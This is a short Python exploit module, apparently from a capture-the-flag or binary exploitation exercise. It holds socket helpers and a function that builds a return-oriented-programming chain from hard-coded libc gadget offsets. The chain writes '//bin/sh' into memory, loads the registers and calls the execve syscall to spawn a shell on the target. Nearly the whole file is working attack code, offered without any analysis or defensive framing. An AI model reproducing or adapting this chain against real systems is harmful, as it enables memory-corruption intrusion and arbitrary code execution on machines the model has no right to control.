import struct

# pack a into an unsigned quad word
def p(a):
    return struct.pack('Q', a)

# read exactly n bytes from socket s
def recvn(s, n):
    b = b''
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

# return the execve rop chain, given the initial
# padding (to reach the saved return address) and
# the load address of libc
def mkrop(pad, libc_base):
    rebase_0 = lambda x : p(x + libc_base)
    rop = pad
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000026796) # 0x0000000000026796: pop rdi; ret; 
    rop += rebase_0(0x00000000001be1a0)
    rop += rebase_0(0x000000000002890f) # 0x000000000002890f: pop rsi; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x00000000000cb1cd) # 0x00000000000cb1cd: pop rdx; ret; 
    rop += rebase_0(0x00000000001be1a8)
    rop += rebase_0(0x000000000003ee88) # 0x000000000003ee88: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x00000000000580da) # 0x00000000000580da: syscall; ret; 
    return rop
